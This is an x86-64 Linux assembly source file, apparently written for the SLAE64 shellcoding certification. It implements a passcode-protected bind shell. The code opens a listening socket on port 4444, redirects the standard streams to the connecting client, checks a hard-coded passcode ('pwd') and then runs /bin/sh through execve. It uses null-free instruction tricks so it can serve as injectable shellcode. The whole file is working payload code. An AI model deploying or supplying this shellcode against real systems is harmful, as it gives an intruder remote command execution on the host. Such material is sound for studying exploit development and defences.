; This shellcode has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification :
; http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html
;
; Author : SLAE64-PA-6470 (kahlon81)
; Date : 2018/02/21
;
; nasm -f elf64 bind-shell-passcode-safe.nasm -o bind-shell-passcode-safe.o
; ld bind-shell-passcode-safe.o -o bind-shell-passcode-safe


global _start

section .bss
    buffer resb 20               ; buffer of 20 bytes
    buffer_size equ $ - buffer   ; buffer size
    
section .data
    passcode: db 'pwd',0x0a
    passcode_required: db '#passcode : '
    passcode_required_size equ $ - passcode_required

section .text
_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 

	xor rax, rax
	mov al, 41

	xor rdi, rdi
	mov dil, 2
	
	xor rsi, rsi
	mov sil, 1

	xor rdx, rdx
	
	syscall

	; copy socket descriptor to rdi for future use 

	mov rdi, rax

	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)

	xor rax, rax 

	push rax

	mov dword [rsp-4], eax
	mov word [rsp-6], 0x5c11

	mov word [rsp-8], 0x1FF
	sub word [rsp-8], 0x1FD

	sub rsp, 8

	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	; syscall number 49

	xor rax, rax
	mov al, 49	

	mov rsi, rsp
	
	xor rdx, rdx
	mov dl, 16	

	syscall

	; listen(sock, MAX_CLIENTS)
	; syscall number 50

	xor rax, rax
	mov al, 50

	xor rsi, rsi
	mov sil, 2
	
	syscall

	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	; syscall number 43

	xor rax, rax
	mov al, 43

	sub rsp, 16
	mov rsi, rsp
    mov byte [rsp-1], 16
    sub rsp, 1
    mov rdx, rsp

    syscall

	; store the client socket description 
	mov r9, rax 

    ; close parent

	xor rax, rax
	mov al, 3	

    syscall

    ; duplicate sockets

    ; dup2 (new, old)
    mov rdi, r9
        
	xor rax, rax
	mov al, 33        

	xor rsi, rsi

    syscall

	xor rax, rax
	mov al, 33        

	xor rsi ,rsi
	mov sil, 1	

    syscall

	xor rax, rax
	mov al, 33

	xor rsi, rsi
	mov sil, 2	

    syscall


	; passcode is required
        
	xor rdx, rdx
	mov dl, passcode_required_size
	
	;mov rsi, passcode_required
	push 0x203a2065			    ; #passcode : 
	mov rbx, 0x646f637373617023	; #passcode : 
	push rbx
	mov rsi, rsp 

	xor rdi, rdi
	mov dil, 1   ; stdout
    xor rax, rax
	mov al, 1    ; sys_write
	syscall	

	; user input
        
	;mov rdx, buffer_size
    xor rdx, rdx
	mov dl, buffer_size	

	;mov rsi, buffer
    mov rbx, 0x0101010101010101
	push rbx
	mov rsi, rsp

	xor rdi, rdi   ; stdin
    xor rax, rax 
	syscall        ; sys_read

	; check passcode 
	
	;lea rsi, [buffer]      ; user passcode
	;mov rsi, buffer

	;lea rdi, [passcode]    ; true passcode
	;mov rdi, passcode
	push 0x0a647770		    ; pwd0x0a
	mov rdi, rsp

	xor rcx, rcx 
	dec rcx
cmp_pwd:
	inc rcx
    mov al, byte [rsi + rcx]
	mov dl, byte [rdi + rcx]
	cmp al, dl                  ; compare each character
    jne exit                    ; jump out of loop if they are not the same
	cmp dl, 0x0a                ; end of string ?
	jne cmp_pwd                 ; not finished, loop again
 

	; shellcode

    ; execve

    ; First NULL push

    xor rax, rax
    push rax

    ; push /bin//sh in reverse

    mov rbx, 0x68732f2f6e69622f
    push rbx

    ; store /bin//sh address in RDI

    mov rdi, rsp

    ; Second NULL push
    push rax

    ; set RDX
    mov rdx, rsp

    ; push address of /bin//sh
    push rdi

    ; set RSI

    mov rsi, rsp

    ; Call the execve syscall
    add rax, 59
    syscall

exit:
	xor rdi, rdi
	add dil, 1
	xor rax, rax
	add al, 60
    syscall
